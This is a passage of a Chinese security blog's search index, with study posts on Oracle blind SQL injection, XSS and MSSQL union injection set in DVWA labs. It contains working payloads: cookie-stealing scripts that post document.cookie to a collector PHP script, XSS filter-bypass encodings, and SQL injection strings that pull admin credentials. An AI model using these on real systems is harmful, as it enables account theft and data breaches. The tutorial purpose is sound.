class="sql">selcet?sname=1&#39; and (select ascii(substr(table_name,1,1)) from user_tables where rownum=1)=84—selcet?sname=1&#39; and (select ascii(substr(table_name,2,1)) from user_tables where rownum=1)=95-- selcet?sname=1&#39; and (select ascii(substr(table_name,3,1)) from user_tables where rownum=1)=85-- selcet?sname=1&#39; and (select ascii(substr(table_name,4,1)) from user_tables where rownum=1)=83-- selcet?sname=1&#39; and (select ascii(substr(table_name,5,1)) from user_tables where rownum=1)=69-- selcet?sname=1&#39; and (select ascii(substr(table_name,6,1)) from user_tables where rownum=1)=82-- </code></pre><p>（3）使用Burp 实现半自动化盲注</p><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>oracle 查询需要带上表名，dual万能表。</p><pre><code class="sql">select 1,2,3 from dual       </code></pre><p>查询当前数据库的所有表名</p><pre><code class="sql">select table_name from user_tables</code></pre><p>查询表名为xxx的所有字段名</p><pre><code class="sql">select column_name from user_tab_columns where table_name=&#39;xxx&#39;</code></pre><p>联合查询：</p><pre><code class="sql">-1&#39; union select &#39;1&#39;,&#39;2&#39;,&#39;3&#39; from dual --  -1&#39; union select table_name,&#39;2&#39;,&#39;3&#39; from user_tables where rownum=1 --  //查询到一张表T_USER-1&#39; union select column_name,&#39;2&#39;,&#39;3&#39; from user_tab_columns where table_name=&#39;T_USER&#39; and rownum=1 --  //查询到一个字段SUSER-1&#39; union select SUSER,&#39;2&#39;,&#39;3&#39; from T_USER where rownum=1 --  </code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 安全进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS注入原理与实践进阶</title>
      <link href="2021/04/27/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/XSS%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/"/>
      <url>2021/04/27/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/XSS%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="XSS的原理与分类"><a href="#XSS的原理与分类" class="headerlink" title="XSS的原理与分类"></a>XSS的原理与分类</h2><h3 id="XSS漏洞简介"><a href="#XSS漏洞简介" class="headerlink" title="XSS漏洞简介"></a>XSS漏洞简介</h3><p>（1）跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。<strong>恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码<br>会被执行，从而达到恶意攻击用户的目的。</strong></p><p>（2）危害：</p><ul><li>流量劫持：将A站的流量引流到B站。原来要访问A，结果访问B。</li></ul><pre><code>window.location.href=b</code></pre><ul><li>获取用户cookie信息，盗取账号</li></ul><pre><code>document.cookie</code></pre><ul><li>篡改、删除页面信息（钓鱼）</li></ul><pre><code>使页面为空：Document.getElementByTagName(&#39;body&#39;)[0].innerHTML=&#39;&#39;document.getElementByTagName(body)[0].innerhtml=&#39;&#39;将原有页面内容置空，变成一个空页面。</code></pre><ul><li>配合CSRF攻击，实施进一步的攻击</li></ul><p>（3）跨站脚本注入漏洞产生的根本原因是由于WEB服务端读取了<strong>用户可控数据输出到HTML页面的过程中没有进行安全处理</strong>导致的。<br>用户可控数据：所有来自客户端的数据都可以被客户端控制，包括<strong>url、参数、HTTP头部字段（cookie、referer、HOST等）、请求正文</strong>等都属于用户可控数据。</p><p>（4）学习XSS注入漏洞需要关注的点：  </p><ul><li>用户可控输入的位置：用户哪一项可控输入被读取？</li><li>处理用户输入的代码在什么位置？</li><li>用户输入是否经过存储？</li><li>输出的页面是哪一个？</li><li>输出的内容位于页面的哪个位置？</li></ul><p><img src="https://i.loli.net/2021/05/10/EnlLXaf3U1hNZbt.png" alt="image-20210510095948192"></p><p>注：通常XSS注入并<strong>不能对服务器产生直接的危害</strong>，而是通过<strong>攻击客户端（其他用户）</strong>来达到攻击目标。</p><h3 id="XSS的分类"><a href="#XSS的分类" class="headerlink" title="XSS的分类"></a>XSS的分类</h3><p><strong>基于用户可控数据的来源和输出的位置，可以将XSS分为三类：</strong></p><p>（1）反射型XSS：直接将HTTP请求中的用户可控数据输出到HTML页面中的跨站脚本注入，由于用户可控数据没有被存储，因此只能在单次请求中生效。</p><p>（2）存储型XSS：又叫持久型XSS，直接将HTTP请求中的<strong>用户可控数据存储至数据库中</strong>，再从数据库中读取出来输出到HTML页面上，由于数据经过存储，可以持续被读取，攻击影响面和危害都较高</p><p>（3）DOM-XSS：特殊的跨站，将用户可控数据通过JavaScript和DOM技术输出到HTML中，利用方式通常与反射型XSS类似</p><table><thead><tr><th align="center">类型</th><th align="center">获取用户输入</th><th align="center">输出位置</th><th align="center">攻击代码</th><th align="center">攻击触发</th><th align="center">处理代码位置</th></tr></thead><tbody><tr><td align="center">反射型</td><td align="center">HTTP请求</td><td align="center">当前响应页面</td><td align="center">不存储</td><td align="center">必须带攻击代码</td><td align="center">服务端</td></tr><tr><td align="center">存储型</td><td align="center">HTTP请求(输入)/数据库(输出)</td><td align="center">可能在其他响应页面</td><td align="center">存储</td><td align="center">无需携带攻击代码</td><td align="center">服务端</td></tr><tr><td align="center">DOM型</td><td align="center">浏览器本地</td><td align="center">当前页面</td><td align="center">不存储</td><td align="center">必须带攻击代码</td><td align="center">客户端</td></tr></tbody></table><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射型XSS也被称为非持久性XSS，当用户访问一个带有XSS代码的HTML请求时，服务器端接收数据后处理，然后把带有XSS的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，就造成XSS漏洞，这个过程就像一次反射，所以<br>叫反射型XSS。</p><h4 id="反射型XSS常见位置"><a href="#反射型XSS常见位置" class="headerlink" title="反射型XSS常见位置"></a>反射型XSS常见位置</h4><p>反射型跨站常见的出现位置：<strong>用户登录、搜索框、订单提交</strong>等位置经常会引用客户可控输入，如果没有进行很好的处理很容易出现反射型跨站漏洞，URL本身常见的跨站注入点。</p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>存储型XSS又被称为持久性XSS，存储型XSS是最危险的一种跨站脚本漏洞，当攻击者提交一段 XSS代码后，被服务端接收并存储，当攻击者或用户再次访问某个页面时，这段XSS代码被程序读出来响应给浏览器，造成XSS跨站攻击，这是存储型XSS。</p><p>1、攻击者在留言板中提交一段XSS代码，服务端接收后并进行存储；</p><p>2、当管理员查看留言板时便触发了XSS代码，形成XSS跨站攻击；</p><h4 id="存储型XSS常见位置"><a href="#存储型XSS常见位置" class="headerlink" title="存储型XSS常见位置"></a>存储型XSS常见位置</h4><p>存储型跨站常见的出现位置：<strong>用户留言、评论、用户昵称、用户信息</strong>等凡是可以提交数据由服务器进行存储和显示的位置都有可能出现存储型跨站。</p><h4 id="利用存储型XSS实现手工盗取cookie"><a href="#利用存储型XSS实现手工盗取cookie" class="headerlink" title="利用存储型XSS实现手工盗取cookie"></a>利用存储型XSS实现手工盗取cookie</h4><p><strong>方法一：</strong></p><ul><li>JavaScript脚本</li></ul><pre><code class="javascript">&lt;script&gt;document.location=&quot;http://127.0.0.1/getCookie.php?cookie=&quot;+document.cookie;&lt;/script&gt;</code></pre><ul><li>getCookie.php脚本</li></ul><pre><code class="php">&lt;?php$cookie = $_GET[&#39;cookie&#39;];$log = fopen(&quot;cookie.txt&quot;, &quot;w&quot;);fwrite($log, $cookie .&quot;\n&quot;);fclose($log);echo &quot;攻击成功&quot;;?&gt;</code></pre><p>（1）利用DVWA作为实验环境，将DVWA Security设置为low。在XSS Stored模块的留言板上留言。</p><p>（2）由于存在输入的字符长度限制，因此通过修改源码突破该限制。然后输入JavaScript脚本。</p><p><img src="https://i.loli.net/2021/05/10/b7gqRfM5L9xUjTl.png" alt="image-20210510103842802"></p><p>（3）页面发生跳转，后台的cookie文件获取到用户的cookie值。</p><p><img src="https://i.loli.net/2021/05/10/2Csa9wNjvockUy4.png" alt="image-20210510104045000"></p><p><img src="https://i.loli.net/2021/05/10/ewrCnLBZ4RDXgJk.png" alt="image-20210510104119313"></p><p><strong>方法二：AJAX</strong></p><ul><li>JavaScript脚本</li></ul><pre><code class="html">&lt;script&gt;var url=&quot;http://127.0.0.1/cookie1.php&quot;;var data=&quot;cookie=&quot;+document.cookie;var nxhr=new XMLHttpRequest();nxhr.setRequestHeader(&quot;content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);nxhr.send(data);&lt;/script&gt;</code></pre><ul><li>cookie1.php</li></ul><pre><code class="php">&lt;?phpdata_default_timezone_set(&quot;Asia/shanghai&quot;);$cookie=$_POST[&#39;cookie&#39;];$time=data(&quot;Y-m-d H:i&quot;);echo $time;$refer=$_SERVER[&#39;HTTP_REFERER&#39;];$content=$time.&quot;::&quot;.&quot;$refer&quot;.&quot;::&quot;.$cookie.&quot;\r\n&quot;;file_put_contents(&quot;cookie.txt&quot;,$content,FILE_APPEND);?&gt;</code></pre><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>（1）XSS利用DOM的结构定义</p><p>（2）DOM结构是将HTML文件的节点构建成树状结构，以此反应HTML本身的阶层结构。用过构造javascript恶意语句就可以修改HTML的DOM结构中的某个值，从而触发跨站脚本攻击。</p><pre><code class="html">&lt;html&gt;&lt;head&gt;&lt;title&gt;DOM XSS&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;a href=&quot;我的链接&quot;/&gt;&lt;h1&gt;我的标题&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/05/10/RCrqI7XtH6BpKai.png" alt="image-20210510194453253"></p><p>（3）HTML DOM的方法</p><ul><li>getElementById()：                  返回带有指定ID的元素</li><li>getElementsByTagName()：    返回包含带有指定标签名称的所有元素的节点列表</li><li>getElementsByClassName() ：返回包含带有指定类名的所有元素的节点列表</li><li>setAttribute()：                         把指定属性设置或修改为指定的值</li></ul><h4 id="利用DOM结构修改节点值"><a href="#利用DOM结构修改节点值" class="headerlink" title="利用DOM结构修改节点值"></a>利用DOM结构修改节点值</h4><p>（1）例子：</p><ul><li>当有id存在时</li></ul><pre><code class="html">&lt;p id=&quot;ndsec&quot;&gt;done&lt;/p&gt;&lt;script&gt;x=document.getElementById(&quot;ndsec&quot;);   //x=document.getElementById(&quot;ID属性的值&quot;);document.write(x.innerHTML);      //x的值为doone&lt;/script&gt;  </code></pre><ul><li>当没有id时</li></ul><pre><code class="html">&lt;a href=http://www.baidu.com&gt;1&lt;/a&gt;&lt;script&gt;document.getElementsByTagName(&quot;a&quot;)[0].href=&quot;http://www.doone.com.cn&quot;;//getElementsByTagName(&quot;标签名&quot;)[第几个标签].要修改的属性名//最终http://www.baidu.com被替换成http://www.done.com.cn&lt;/script&gt;</code></pre><ul><li>XSS语句插入的位置在要修改DOM节点之前</li></ul><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;NewDoone&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt; /*HTML语句是从上往下执行的，如果只是用一行语句，则当要修改的DOM节点的语句还未执行时，是不会生效的。 这里使用两个语句，第一行语句指当body语句执行完成之后，触发onload则执行函数里的语句。而触发onload时，DOM语句已经加载完毕。 */document.getElementsByTagName(&quot;body&quot;)[0].onload=function changeLink()&#123;document.getElementsByTagName(&quot;a&quot;)[1].href=&quot;http://www.doone.com.cn&quot;;&#125;//当要修改事件属性如onload或onclick属性，需要用定义一个函数function xx()&#123;&#125;的写法。&lt;/script&gt;&lt;a id= &quot;abc1&quot; href=http://www.baidu.com&gt;test1&lt;/a&gt;&lt;a id= &quot;abc2&quot; href=http://www.baidu.com&gt;test2&lt;/a&gt;&lt;a id= &quot;abc3&quot; href=http://www.baidu.com&gt;test3&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>（2）XSS利用DOM修改登陆页面忘记密码的链接。</p><pre><code class="html">http://xxx/login.php?url=index.php&quot;/&gt;&lt;script&gt;document.getElementsByTagName(&quot;body&quot;)[0].onload=function changeLink()&#123;document.getElementsByTagName(&quot;input&quot;)[3].onclick=function xss()&#123;window.location.href=&#39;http://www.doone.com.cn&#39;;&#125;;&#125;&lt;/script&gt;&lt;from&quot;</code></pre><h2 id="XSS的渗透思路"><a href="#XSS的渗透思路" class="headerlink" title="XSS的渗透思路"></a>XSS的渗透思路</h2><h3 id="XSS的Payload构造"><a href="#XSS的Payload构造" class="headerlink" title="XSS的Payload构造"></a>XSS的Payload构造</h3><p>（1）构造XSS Payload是测试XSS注入攻击的核心工作，针对可疑的注入点，我们需要根据用户可控输入的输出位置采用不同的方式尝试构造Payload，并根据应用的安全防护规则调整payload，根据返回结果判断漏洞是否存在以及风险的高低程度。</p><p>（2）根据输出位置选择payload构造方式</p><ul><li>空白位置：插入新的script标签</li><li>HTML标签中：闭合标签并建立新的script标签</li><li>HTML标签属性中：闭合标签属性插入新的属性</li><li>JavaScript中：闭合JavaScript语句并写入新的语句</li><li>css中：闭合css标签属性并插入新的script标签</li></ul><p>（3）根据过滤规则调整payload</p><ul><li>大小写</li><li>编码</li><li>双写</li><li>特殊的脚本标签</li><li>事件属性执行脚本</li><li>仅插入标签</li></ul><p>（4）根据返回结果判断漏洞是否存在以及风险的高低程度</p><ul><li>可执行任意脚本代码：严重风险</li><li>可执行有限制的脚本代码：高风险</li><li>只可插入标签无法执行脚本代码：中风险</li><li>可改变HTML结构但无法插入完整标签：低风险</li><li>无法插入有危险的内容：无漏洞</li></ul><h3 id="XSS的基本payload"><a href="#XSS的基本payload" class="headerlink" title="XSS的基本payload"></a>XSS的基本payload</h3><p>（1）利用&lt; &gt;标记注入Html/Javascript。</p><pre><code>&lt;script&gt;[code]&lt;/script&gt;  --&gt; &lt;script&gt;alert(/xss/)&lt;/script&gt;</code></pre><p>（2）利用HTML标签属性值执行XSS。</p><pre><code>         &lt;HTML标记  javascript:[code]&gt; ---&gt;     &lt;img src=&quot;javascript:alert(&#39;1&#39;); &quot;&gt;  （IE6版本）         &lt;a href=&quot;javascript:alert(1)&quot;&gt;</code></pre><p>（3）通过事件来触发XSS。</p><pre><code> &lt;HTML标记 on事件=code&gt; 如---&gt; &lt;img src=1 onerror=&quot;window.location.href=&#39;http://www.baidu.com&#39;&quot;/&gt; 或&lt;img src=1 onerror=&quot;javascript:alert(666)&quot;&gt;</code></pre><h3 id="JavaScript伪协议"><a href="#JavaScript伪协议" class="headerlink" title="JavaScript伪协议"></a>JavaScript伪协议</h3><p><strong>javascript:这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行</strong></p><pre><code>javascript:URL</code></pre><p>（1）将javascript代码添加到客户端的方法是把它放置在伪协议说明符javascript:后的URL中。如果javascript:URL中的javascript代码含有多个语句，必须使用分号将这些语句分隔开。这样的URL如下所示：</p><pre><code>javascript:var now = new Date(); &quot;&lt;h1&gt;The time is:&lt;/h1&gt;&quot; + now;</code></pre><p>（2）当浏览器装载了这样的URL时，它将执行这个URL中包含的javascript代码，并把最后一条javascript语句的字符串值作为新文档的内容显示出来。这个字符串值可以含有HTML标记，并被格式化，其显示与其他装载进浏览器的文档完全相同。</p><p>（3）javascript URL还可以含有只执行动作，但不返回值的javascript语句。例如：</p><pre><code>javascript:alert(&quot;hello world!&quot;)//装载了这种URL时，浏览器仅执行其中的javascript代码，但由于没有作为新文档来显示的值，因此它并不改变当前显示的文档</code></pre><h3 id="payload构造实例"><a href="#payload构造实例" class="headerlink" title="payload构造实例"></a>payload构造实例</h3><p>（1）闭合标签：在具体的实战中，通过闭合标签，使输入的基本语句得以实现。</p><p><img src="https://i.loli.net/2021/05/10/BQvSz2LPUHNXYAk.png" alt="image-20210510213017214"></p><p>（2）闭合引号：在具体的实战中，通过闭合单/双引号，使输入的基本语句得以实现。</p><p><img src="https://i.loli.net/2021/05/10/wHmLseF3xdoG8q2.png" alt="image-20210510213112179"></p><h2 id="XSS绕过防护的技巧"><a href="#XSS绕过防护的技巧" class="headerlink" title="XSS绕过防护的技巧"></a>XSS绕过防护的技巧</h2><h3 id="针对输入输出的防护机制"><a href="#针对输入输出的防护机制" class="headerlink" title="针对输入输出的防护机制"></a>针对输入输出的防护机制</h3><p>在具体的实战中，构造的基本语句往往不能直接实现，因为存在防护机制。</p><p><img src="https://i.loli.net/2021/05/10/5fWYCLZgkwcOmjT.png" alt="image-20210510213512262"></p><h3 id="XSS防护规则的判断与绕过"><a href="#XSS防护规则的判断与绕过" class="headerlink" title="XSS防护规则的判断与绕过"></a>XSS防护规则的判断与绕过</h3><p>为了避免XSS漏洞的存在，通常应用会对用户输入进行一定的安全处理后再输出的HTML中，在进行XSS漏洞测试时需要推测出应用的安全处理方法（即防护规则），并采用对应的绕过方式来进行绕过测试。通常防护规则会检测输入中是否有html标签或脚本的关键字并进行处理，根据处理方法的不同可分为过滤、编码、删除、插入等，有时会使用多种方法共同防护。</p><p><img src="https://i.loli.net/2021/05/10/Vp1G8hvEzOfBkHI.png" alt="image-20210510213848138"></p><h3 id="XSS绕过规则之符号与关键字"><a href="#XSS绕过规则之符号与关键字" class="headerlink" title="XSS绕过规则之符号与关键字"></a>XSS绕过规则之符号与关键字</h3><p>（1）利用符号判断语句：’’;!–”&lt;XSS&gt;=&amp;{()}</p><p>（2）关键字判断：script、alert、javascript、expression等……</p><p>（3）常见事件属性：</p><ul><li>onerror</li><li>onmouseover</li><li>onclick</li><li>onload</li><li>oninput</li><li>oncut</li><li>onscroll</li></ul><p>（4）alert()的替代词：confirm()、prompt()</p><h3 id="XSS绕过方式"><a href="#XSS绕过方式" class="headerlink" title="XSS绕过方式"></a>XSS绕过方式</h3><p>（1）大小写绕过</p><pre><code>&lt;img src=&quot;javascript:alert(0) ;&quot;&gt;&lt;IMG SRC=&quot;javascript:alert(0) ;&quot;&gt;&lt;iMg sRC=&quot;jaVasCript:alert(0);&quot;&gt;&lt;img src=1 onerror=&quot;alert(/1/)&quot;&gt;&lt;iMg sRc=1 oNerror=&quot;alert(/1/)&quot;&gt;</code></pre><p>（2）双写绕过</p><pre><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;&gt;alert(/xss/)&lt;/&gt;&lt;scrscriptipt&gt;alert(/xss/)&lt;/scrscriptipt&gt;&lt;img src=1 onerror=&quot;alert(/1/)&quot;&gt;&lt;img src=1 oonnerror=&quot;alert(/1/)&quot;&gt;</code></pre><p>（3）对标签属性值变换成ASCII码</p><ul><li>ASCII编码也就是十进制编码</li><li>如t的ASCII为116，用&amp;#116表示</li><li>冒号：则表示为&amp;#58</li></ul><pre><code>&lt;img src=&quot;javascript:alert(0) ;&quot;&gt;&lt;img src=&quot;javascrip&amp;#116&amp;#58alert(0) ;&quot;&gt;&lt;a href=javascript:alert(1)&gt;&lt;a href=&amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41&gt;</code></pre><p>（4）对标签属性值进行十六进制编码。如a的十六进制编码为&amp;#x61，利用方式和ASCII编码一致。</p><pre><code>&lt;a href=&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3a&amp;#x61&amp;#x6c&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x31&amp;#x29&gt;</code></pre><p>（5）空格替代</p><ul><li>空格可以使用多种字符来进行代替</li><li>如/、//、%0a、%0d、Table键出来的空白替代空格。</li></ul><p>（6）Base64编码</p><ul><li>如&lt;script&gt;alert(“Hello”);&lt;/script&gt;</li><li>经过Base64编码后：PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=</li></ul><pre><code>&lt;objectdata=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=&quot;&gt;&lt;META HTTP-EQUIV=&quot;refresh&quot;CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=&quot;&gt;</code></pre><p>（7）base64,16进制,10进制,编码再使用eval()、window[atob()]函数执行</p><ul><li>如：alert(‘XSS’);</li><li>经过JS 16进制编码后：\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29\x3b\xa</li></ul><pre><code>&lt;script&gt;eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29\x3b&quot;)&lt;/script&gt;</code></pre><ul><li>window[atob(‘eval’)]</li></ul><pre><code>&lt;script&gt;window[atob(&#39;ZXZhbA==&#39;)](&quot;\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29\x3b&quot;);&lt;/script&gt;</code></pre><p>（8）参数间接传值</p><ul><li><p>思路：输入的语句并不会直接执行带有恶意的XSS payload语句，而是通过传递恶意语句到某些参数从而达到间接执行的目的。</p></li><li><p>例1：<a href="http://www.evil.com这个网站是一个恶意页面.http//10.10.10.135/xss/test.php%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E6%99%AE%E9%80%9A%E7%9A%84%E6%B5%8B%E8%AF%95%E9%A1%B5%E9%9D%A2%E3%80%82">http://www.evil.com这个网站是一个恶意页面。http://10.10.10.135/xss/test.php这是一个普通的测试页面。</a></p><pre><code>http://10.10.10.135/xss/test.php?name=test&lt;input name=&quot;http://www.evil.com&quot;             value=&quot;xsstest&quot; oninput=&quot;window.location=this.name&quot;&gt;http://www.evil.com可以直接替换成恶意语句如：javascript:alert(1)。</code></pre></li><li><p>例2（IE &lt;=8版本）</p><pre><code>http://10.10.10.135/xss/test.php?name=test&lt;a href=&quot;123&quot; id=&quot;x&quot;&gt;test&lt;/a&gt;&lt;script&gt;x=&#39;javascript:alert(1)&#39;&lt;/script&gt;&lt;script&gt;x.toString()==&#39;123&#39;&lt;/script&gt;</code></pre></li></ul><h2 id="XSS漏洞的防御"><a href="#XSS漏洞的防御" class="headerlink" title="XSS漏洞的防御"></a>XSS漏洞的防御</h2><p>（1）XSS的威力主要是取决于JavaScript能够实现的程度，XSS跨站脚本的形成原因是对输入输出没有严格过滤，导致在页面上可以执行JavaScript等客户端代码，所以只要将敏感字符过滤，就可以修复XSS跨站漏洞。</p><p>（2）修复和防范方法：</p><ul><li>Web客户端和服务端对用户的输入输出进行过滤或转义，如：&lt;，&gt;，script；</li><li>浏览器设置为高安全级别，Cookie属性HttpOnly设置为true，浏览器将禁止 javascript访问带有HttpOnly属性的cookie；</li><li>Web服务器安装WAF/IDS/IPS等产品，拦截攻击代码；</li><li>关闭浏览器自动密码填写功能，防止被钓鱼页面、表单调取账号密码；</li></ul><p>（3）例：实现过滤特殊字符（图为DVWA中xss模块防御源码）：</p><pre><code class="php">&lt;?php header (&quot;X-XSS-Protection: 0&quot;); // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) &#123;     // Get input     $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );     // Feedback for end user     echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;; &#125; ?&gt; </code></pre><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>需要一个前端页面，能够给用户进行输入用户信息</p><p>需要有一个后端页面，能够接收用户输入，并且将用户对应信息输出。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSSQL的手工注入</title>
      <link href="2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MSSQL%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/"/>
      <url>2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MSSQL%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="MSSQL数据库注入的利用"><a href="#MSSQL数据库注入的利用" class="headerlink" title="MSSQL数据库注入的利用"></a>MSSQL数据库注入的利用</h2><h3 id="MSSQL内置函数"><a href="#MSSQL内置函数" class="headerlink" title="MSSQL内置函数"></a>MSSQL内置函数</h3><p>（1）host_name() ：返回服务器端计算机名称</p><p>（2）db_name () ：返回当前数据库的名称</p><p>（3）current_user：返回当前数据库的用户名</p><p>（4）subString (string,m,n) ：字符串截取函数，截取从第m个字符到第n个字符</p><p>（5）CHAR() ：ascii转字符函数</p><p>（6）@@version：查看数据库版本</p><p>（7）ISNULL(NULL,m) ：判断查询是否带有NULL，有则用m替换</p><pre><code class="sql">select ISNULL(db_name(),0)    -- 若当前数据库为dvwa，查询结果为dvwaselect ISNULL(NULL,123)    -- 查询结果为123</code></pre><p>（8）CAST(a as type) 字符类型转换，将a转换为type类型，如果转换失败会将a结果显示在页面上</p><p>（9）object_id() 根据表名返回数据库表名ID</p><p>（10）object_name() 根据ID返回数据库表名</p><p>（11）col_name ( object_id , column_id )函数 ：返回指定表中指定字段（列）的名称</p><h3 id="内置系统表"><a href="#内置系统表" class="headerlink" title="内置系统表"></a>内置系统表</h3><p>（1）sysdatabases表：该表只保存在master数据库中，这个表中保存的是所有的库名,以及库的ID，和一些相关信息。</p><p>name列存放着数据库名。</p><pre><code class="sql">select name from master..sysdatabases;select name from master.dbo.sysdatabases;</code></pre><p>（2）sysobjects表：SQL-SERVER的每个数据库内都有此系统表，它存放该数据库内创建的所有对象，如约束、默认值、日志、规则、存储过程等，每个对象在表中占一行。以下是此系统表的字段名称和相关说明。</p><ul><li><strong>Name，id，xtype，uid，status</strong>：分别是对象名，对象ID，对象类型，所有者对象的用户ID，对象状态。当xtype=’U’ and status&gt;0代表是用户建立的表，对象名就是表名，对象ID就是表的ID值。</li><li>name列 存放着数据库的所有的表名 。</li></ul><pre><code class="sql">select name from sysobjects where xtype=&#39;U&#39;;select id from sysobjects where xtype=&#39;U&#39;;</code></pre><p>（3）syscolumns表：该表位于每个数据库中。主要字段有： <strong>name ，id， colid</strong> ；分别是字段名称，表ID号，字段ID号，<strong>其中的 ID 是用sysobjects得到的表的ID号。</strong>name列存放着数据库的所有的列名</p><pre><code class="sql">select name from syscolumns;-- 限定结果：select name from syscolumns where id=(select id from 数据库名..sysobjects where name=&#39;表名&#39;)</code></pre><h2 id="MSSQL联合查询"><a href="#MSSQL联合查询" class="headerlink" title="MSSQL联合查询"></a>MSSQL联合查询</h2><p>（1）判断列数：order by N</p><p>（2）判断数据回显位置 union select </p><ul><li>union select：会把重复项去除</li><li>union all select：全显示</li><li>union select null,null,null…</li></ul><p>（3）获取任意一行的方式</p><pre><code class="sql">-- 获取前m行的数据，然后丢弃，再向下获取n行的数据select top n username from users where username not in (select top m username from users);-- 多个列拼接到一个列查询的方式select username+&#39;.&#39;+password from users;</code></pre><h3 id="语句构造"><a href="#语句构造" class="headerlink" title="语句构造"></a>语句构造</h3><p>（1）UNION 操作符用于合并两个或多个 SELECT 语句的结果集。UNION 内部的 SELECT 语句必须拥有<strong>相同数量的列</strong>。列也必须拥有<strong>相同的数据类型。</strong>当UNION之前的select语句结果集为空时，<strong>查询结果将由UNION后的SELECT语句控制。</strong></p><p><img src="https://i.loli.net/2021/04/29/OhNUvZpQjostDn8.png" alt="image-20210429161933859"></p><p>（2）MSSQL数据库为强类型，union的查询类型要相同。例如原有查询语句由6列，可先将6个位置都设置为字符串类型’1’,’2’,’3’,’4’,’5’,’6’，根据报错信息逐个修改数据类型，最后得出每个位置的数据类型。</p><p>（3）若提交后提示”text 数据类型不能选为 DISTINCT，因为它不可比”的错误，产生这一错误的原因是<strong>union语句合并查询时是默认去除重复项的，也就是默认执行了distinct操作。</strong>将union 改为 <strong>union all</strong> 不去除重复项，就能够解决这个报错。</p><p>（4）判断数据回显位置时，需要先将原有查询语句置空。可以将union all后的某些位置改为字符串以确认该位置是否回显。</p><p>（5）确定列数和回显位置后，即可在回显位置写入查询语句以获取需要的信息。</p><ul><li>获取当前数据库名称</li></ul><pre><code class="sql"> 1%&#39; union all select &#39;1&#39;,db_name(),&#39;3&#39;,&#39;4&#39;,5,6 --</code></pre><ul><li>获取所有数据库的名称</li></ul><pre><code class="sql">1%&#39; union all select &#39;1&#39;,name,&#39;3&#39;,&#39;4&#39;,5,6 from master..sysdatabases --</code></pre><ul><li>获取关键数据库中的表名信息</li></ul><pre><code class="sql">1%&#39; union all select &#39;1&#39;,name,&#39;3&#39;,&#39;4&#39;,5,6 from ST_WebCourse..sysobjects where xtype=&#39;U&#39; --</code></pre><ul><li>获取关键表中的列名信息</li></ul><pre><code class="sql">1%&#39; union all select &#39;1&#39;,name,&#39;3&#39;,&#39;4&#39;,5,6 from ST_Webcourse..syscolumns where id=(select id from ST_Webcourse..sysobjects where name=&#39;ST_admin&#39;) --</code></pre><ul><li>获取列名中的关键数据</li></ul><pre><code class="sql">1%&#39; union all select &#39;1&#39;,admin,&#39;3&#39;,&#39;4&#39;,5,6 from ST_admin -- 1%&#39; union all select &#39;1&#39;,pass,&#39;3&#39;,&#39;4&#39;,5,6 from ST_admin  -- 